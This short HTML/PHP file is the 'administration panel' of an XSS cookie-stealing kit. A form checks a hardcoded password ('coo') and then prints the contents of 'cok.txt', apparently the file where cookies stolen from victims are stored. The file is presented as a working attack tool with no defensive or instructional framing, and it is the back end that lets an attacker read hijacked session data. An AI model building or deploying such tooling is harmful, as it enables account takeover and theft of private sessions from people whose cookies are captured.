<!DOCTYPE html>
<html>
<head>
	<title>XSS Cookie Hacker ~ Administration Panel</title>
	<style>
.kutu {
	width: 1900px;
      height:150px;
      border: 5px solid white;
      background-color:black;

  }

.header {
	color: white;
	font-family: 'Trebuchet MS', sans-serif;

};
</style>

</head>
<body>
<center>

<div class="kutu">
	<br>
	<br>
<h1 class="header">XSS Cookie Hacker Administration [v2]</h1>
</div>
<form method="POST">
	<input type="text" name="login">
</form>
</center>
</body>
</html>
<?php
error_reporting(0);
$l = $_POST["login"];
if ($l == "coo") {
	echo readFile('cok.txt');
} else {
	echo "Coming Soon.";
}

?>
